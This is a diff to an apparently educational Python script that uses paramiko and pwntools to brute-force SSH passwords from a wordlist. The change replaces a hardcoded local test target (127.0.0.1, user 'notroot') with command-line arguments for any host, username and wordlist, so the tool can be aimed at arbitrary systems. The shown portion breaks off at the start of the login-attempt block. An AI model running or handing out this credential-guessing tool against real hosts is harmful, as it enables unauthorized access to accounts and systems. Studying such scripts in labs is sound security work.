@@ -13,14 +13,21 @@ Date: 13-08-2025
 
 from pwn import *
 import paramiko
+import argparse
 
+parser = argparse.ArgumentParser()
+parser.add_argument("-H", "--host")  # Add target IP from command line
+parser.add_argument("-U", "--username") # Add SSH username from command line
+parser.add_argument("-W", "--wordlist") # Add wordlist from command line
+args = parser.parse_args()
 
 # Target host details (127.0.0.1 for local testing)
-host = "127.0.0.1"
-username = "notroot"
+host = args.host
+username = args.username
+wordlist = args.wordlist
 attempts = 0 # This tracks the number of passwords tried
 
-with open("best110.txt", "r") as password_list: #opening password file
+with open(args.wordlist, "r") as password_list: #opening password file
 	for password in password_list: #iterating over each password
 		password = password.strip("\n") #cleaning the password up by removing newline characters
 		try:
